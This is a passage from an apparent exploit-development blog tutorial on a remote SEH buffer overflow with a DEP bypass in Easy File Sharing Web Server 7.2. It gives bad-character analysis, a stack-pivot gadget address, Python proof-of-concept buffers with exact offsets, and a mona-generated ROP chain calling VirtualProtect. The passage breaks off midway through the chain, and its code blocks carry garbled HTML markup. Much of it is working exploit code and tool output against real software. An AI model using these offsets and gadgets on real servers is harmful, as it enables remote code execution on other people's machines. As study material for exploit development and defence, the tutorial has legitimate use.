</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x81</span>\<span class="n">x82</span>\<span class="n">x83</span>\<span class="n">x84</span>\<span class="n">x85</span>\<span class="n">x86</span>\<span class="n">x87</span>\<span class="n">x88</span>\<span class="n">x89</span>\<span class="n">x8a</span>\<span class="n">x8b</span>\<span class="n">x8c</span>\<span class="n">x8d</span>\<span class="n">x8e</span>\<span class="n">x8f</span>\<span class="n">x90</span>\<span class="n">x91</span>\<span class="n">x92</span>\<span class="n">x93</span>\<span class="n">x94</span>\<span class="n">x95</span>\<span class="n">x96</span>\<span class="n">x97</span>\<span class="n">x98</span>\<span class="n">x99</span>\<span class="n">x9a</span>\<span class="n">x9b</span>\<span class="n">x9c</span>\<span class="n">x9d</span>\<span class="n">x9e</span>\<span class="n">x9f</span>\<span class="n">xa0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xa1</span>\<span class="n">xa2</span>\<span class="n">xa3</span>\<span class="n">xa4</span>\<span class="n">xa5</span>\<span class="n">xa6</span>\<span class="n">xa7</span>\<span class="n">xa8</span>\<span class="n">xa9</span>\<span class="n">xaa</span>\<span class="n">xab</span>\<span class="n">xac</span>\<span class="n">xad</span>\<span class="n">xae</span>\<span class="n">xaf</span>\<span class="n">xb0</span>\<span class="n">xb1</span>\<span class="n">xb2</span>\<span class="n">xb3</span>\<span class="n">xb4</span>\<span class="n">xb5</span>\<span class="n">xb6</span>\<span class="n">xb7</span>\<span class="n">xb8</span>\<span class="n">xb9</span>\<span class="n">xba</span>\<span class="n">xbb</span>\<span class="n">xbc</span>\<span class="n">xbd</span>\<span class="n">xbe</span>\<span class="n">xbf</span>\<span class="n">xc0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc1</span>\<span class="n">xc2</span>\<span class="n">xc3</span>\<span class="n">xc4</span>\<span class="n">xc5</span>\<span class="n">xc6</span>\<span class="n">xc7</span>\<span class="n">xc8</span>\<span class="n">xc9</span>\<span class="n">xca</span>\<span class="n">xcb</span>\<span class="n">xcc</span>\<span class="n">xcd</span>\<span class="n">xce</span>\<span class="n">xcf</span>\<span class="n">xd0</span>\<span class="n">xd1</span>\<span class="n">xd2</span>\<span class="n">xd3</span>\<span class="n">xd4</span>\<span class="n">xd5</span>\<span class="n">xd6</span>\<span class="n">xd7</span>\<span class="n">xd8</span>\<span class="n">xd9</span>\<span class="n">xda</span>\<span class="n">xdb</span>\<span class="n">xdc</span>\<span class="n">xdd</span>\<span class="n">xde</span>\<span class="n">xdf</span>\<span class="n">xe0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xe1</span>\<span class="n">xe2</span>\<span class="n">xe3</span>\<span class="n">xe4</span>\<span class="n">xe5</span>\<span class="n">xe6</span>\<span class="n">xe7</span>\<span class="n">xe8</span>\<span class="n">xe9</span>\<span class="n">xea</span>\<span class="n">xeb</span>\<span class="n">xec</span>\<span class="n">xed</span>\<span class="n">xee</span>\<span class="n">xef</span>\<span class="n">xf0</span>\<span class="n">xf1</span>\<span class="n">xf2</span>\<span class="n">xf3</span>\<span class="n">xf4</span>\<span class="n">xf5</span>\<span class="n">xf6</span>\<span class="n">xf7</span>\<span class="n">xf8</span>\<span class="n">xf9</span>\<span class="n">xfa</span>\<span class="n">xfb</span>\<span class="n">xfc</span>\<span class="n">xfd</span>\<span class="n">xfe</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Trigger the crash again and investigate the stack, trying to find an address where the bytearray starts:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/bad_chars_compare.png" alt="bad_chars PNG" /></p>

<p>Now, use mona to find bad chars (it will compare what it sees on the stack with what&rsquo;s in the generated <code>bytearray.bin</code> file):
<code>
!mona compare -f C:\mona_logs\fsws\bytearray.bin -a 0x02EC6F34
</code></p>

<p>Where:</p>

<ul>
<li><strong>-f C:\mona_logs\fsws\bytearray.bin</strong> is location of the bytearray binary (the baseline, expected array)</li>
<li><strong>-a 0x02EC6F34</strong> is an exact address of where our bytearray starts from on the stack</li>
</ul>


<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/bad_char_found.png" alt="bad_char_found PNG" /></p>

<p>Ok, mona found additional bad character - <code>\x3b</code>. Let&rsquo;s repeat above process, remembering to now exclude <code>\x00</code> and <code>\x3b</code> from the bytearray and see if there are any more bad characters. The results should be as below:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/no_more_bad_chars.png" alt="no_more_bad_chars PNG" /></p>

<p>That&rsquo;s it - the bad characters we will have to avoid in our payload are <code>\x00</code> and <code>\x3b</code>.</p>

<h2>Stack pivoting</h2>

<p>Alright, finally we&rsquo;re getting to the more exciting parts! So far it was kind of a general stuff that needs to be done every time you develop an exploit. Don&rsquo;t get me wrong, these were super important tasks that lay out nice foundations for our further work, so always make sure you get your offsets and bad chars out of the way early and are confident and happy about what&rsquo;s happening in the program.</p>

<p>To continue further, we need to understand what happens in the program when the exception is triggered:</p>

<ul>
<li>ESP is moved further &ldquo;up&rdquo; (towards lower addresses of the memory)</li>
<li>command execution is directed to the address in the SEH record (which we control!)</li>
</ul>


<p>Keeping in mind that we&rsquo;re dealing with DEP (we can&rsquo;t simply execute commands on the stack), we need to come up with a ROP chain to get around that.</p>

<p>However, we have an issue to deal with - ESP has been moved far away from the area on the stack that we control, hence, our future ROP chain would not be executed as we&rsquo;re simply not there on the stack.</p>

<p>To visualise what I&rsquo;m talking about, start the program and trigger a crash. As the program crashes, press <code>ctrl</code> + <code>F9</code> to pass execution of the exception code to the program.</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/seh_error.png" alt="seh_error PNG" /></p>

<p>What happened there was:</p>

<ul>
<li>Program tried to execute instruction at the address <code>0x43434343</code> (SEH record), which is invalid address, so that failed, and triggered another exception, which was handled by the system level exception handler</li>
<li>ESP was moved all the way &ldquo;up&rdquo; towards lower addresses</li>
</ul>


<p>What we&rsquo;ll have to do now is to simply move ESP back to the address space we control. To do this, we need to find a single command that will move ESP a certain distance down the stack (towards higher memory addresses) to land in the area of our buffer.</p>

<p>First, we need to calculate how much we need to jump - simply right click on the stack addresses and choose <code>Address</code> -> <code>Relative to ESP</code> and scroll all the way down the stack till you notice data from the buffer (lots of &ldquo;A&#8221;s or <code>0x41</code>).</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/stack_pivot.png" alt="stack_pivot PNG" /></p>

<p>Looking at this, we need to move ESP somewhere around at least <code>0x9F4</code> (decimal 2548) bytes &ldquo;down&rdquo; the stack.</p>

<p>Once again, <code>mona</code> comes with help - at the time of the crash run the following command to generate list of stack pivots that we could use:</p>

<pre><code>!mona stackpivot -distance 2548 -cpb '\x00\x3b'
</code></pre>

<p>Where:</p>

<ul>
<li><strong>-distance 2548</strong> specifies minimum number of bytes to jump - only instructions that jump at least that many bytes will be returned</li>
<li><strong>-cpb &lsquo;\x00\x3b&rsquo;</strong> removes instructions which addresses contain bad characters that would break our exploit</li>
</ul>


<p>Mona will generate a text file <code>stackpivot.txt</code> containing list of potential pivots to use and put it in the mona logs directory.</p>

<p>Open the file and try to find a single instruction that addresses our needs.</p>

<pre><code>0x1002280a : {pivot 4100 / 0x1004} :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}
</code></pre>

<p>It will move the ESP &ldquo;down&rdquo; 4100 bytes, a lot more than we needed, however, it is the smallest one available that fits our needs. Luckily we have plenty of space on the buffer to play with, so in this case, it actually will work fine.</p>

<p>Let&rsquo;s update our exploit to, instead overwriting SEH with garbage, execute the pivot! Once we run the application and trigger the crash, after passing execution back to the program, we should land back on our buffer.</p>

<p>The PoC now looks like this:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offsets</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">seh_offset</span>                   <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0x1002280a</span><span class="p">)</span>     <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>  <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">DDDD</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                            <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>    <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>And that&rsquo;s the result:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/pivot_success.png" alt="pivot_success PNG" /></p>

<p>Now we just need to find out where exactly are we landing on our buffer after the pivot. I guess you could use the offset trick from before or just do some maths manually - turns out that we land exactly <strong>2455</strong> bytes into our buffer, let&rsquo;s keep that in mind and cater for that.</p>

<h2>ROP</h2>

<p>Alright, the most exciting part of the exploit development! <em>ROP ROP ROP your boat, gently down the stream&hellip;</em> :-)</p>

<p>Let&rsquo;s plan the attack! What we&rsquo;ll need to do is come up with a ROP chain that will disable DEP for us. Luckily, Windows already gives us 2 functions we can call (<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898%28v=vs.85%29.aspx">VirtualProtect</a> and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887%28v=vs.85%29.aspx">VirtualAlloc</a>) to achieve this.</p>

<p>They both take quite a few parameters, so, the main task will be to provide them reliably. In cases like this, there&rsquo;s also another neat trick that we can use - using <code>PUSHAD</code> opcode. What it does, it takes values from all of the registers and pushes them on the stack for us. If we can carefully put required values into apropraite registers and call <code>PUSHAD</code>, the registers will be pushed on the stack and, if we then call <code>VirtualProtect</code> function, the values from the stack will be taken as parameters to the function!</p>

<p>As long as we have right values in the right registers (i.e. providing them in a right order to <code>VirutalProtect</code>) it will execute the function correctly! After disabling DEP with ROP, we can simply put the our shellcode right after the ROP chain and it will be successfully executed from the stack.</p>

<p>Before we jump into more details, let&rsquo;s see how our buffer should look like now:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offsets</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nb">buffer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                                <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0x1002280a</span><span class="p">)</span>         <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0xffffffff</span><span class="p">)</span>         <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Once again, <code>mona</code> comes with great help for us - it can actually generate a ROP chain for us (or at least majority of it) making the task a bit simpler.</p>

<p>Run the program, trigger the crash, pass the execution to the program (it will crash again on incorrect EIP) and run <code>!mona modules</code> to find out what DLLs are loaded by the application and if there any restrictions on them.</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/mona_modules.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/mona_modules.png" alt="mona modules PNG" /></a></p>

<p>From the above, we can see that there&rsquo;s bunch of modules loaded, but the ones we are the most interested in, are the ones that are <strong>non-ASLR</strong> and <strong>not rebased</strong>.</p>

<p>It appears that there 2 modules like this <code>fsws.exe</code> and <code>sqlite3.dll</code> - we&rsquo;ll use them to find our ROP gadgets.</p>

<p>Also, a good thing is that they&rsquo;re both application DLLs (not system ones), meaning that they will always be loaded unchanged, regardless of the operating system flavour, hence, our exploit should be quite reliable and cross-platform (hopefully!).</p>

<p>With that in mind, we can now execute the following:</p>

<pre><code>!mona rop -m sqlite3.dll,fsws.exe -cpb '\x00\x3b'
</code></pre>

<p>Where:</p>

<ul>
<li><strong>-m sqlite3.dll,fsws.exe</strong> specifies modules (<code>sqlite3.dll</code> and <code>fsws.exe</code>) in which we want to look for gadgets</li>
<li><strong>-cpb &lsquo;\x00\x3b&rsquo;</strong> ignores gadgets with addresses containing bad characters that would break our exploit</li>
</ul>


<p>Mona will generate bunch of files in it&rsquo;s logs directory:</p>

<ul>
<li><code>rop.txt</code> - containing list of various rop gadgets to use, categorised by the functionality</li>
<li><code>rop_suggestions.txt</code> - another list of various rop gadgets, generally more complex instructions</li>
<li><code>rop_chains.txt</code> - ready made ROP chains to disable DEP using <code>VirutalProtect</code> or <code>VirtualAlloc</code> functions</li>
</ul>


<p>Let&rsquo;s have a look at <code>rop_chains.txt</code> and see if there&rsquo;s something useful we could use:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="p">[</span> <span class="n">Python</span> <span class="p">]</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;&lt;/</span><span class="n">strong</span><span class="o">&gt;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># rop chain generated with mona.py - www.corelan.be</span>
</span><span class='line'><span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c832d0</span><span class="p">,</span>  <span class="c"># ptr to &amp;amp;VirtualProtect() [IAT sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x1002248c</span><span class="p">,</span>  <span class="c"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c18d81</span><span class="p">,</span>  <span class="c"># XCHG EAX,EDI # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x1001d626</span><span class="p">,</span>  <span class="c"># XOR ESI,ESI # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x10021a3e</span><span class="p">,</span>  <span class="c"># ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x10013ad6</span><span class="p">,</span>  <span class="c"># POP EBP # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c227fa</span><span class="p">,</span>  <span class="c"># &amp;amp; push esp # ret  [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x00000000</span><span class="p">,</span>  <span class="c"># [-] Unable to find gadget to put 00000201 into ebx</span>
</span><span class='line'>  <span class="mh">0x10022c4c</span><span class="p">,</span>  <span class="c"># XOR EDX,EDX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
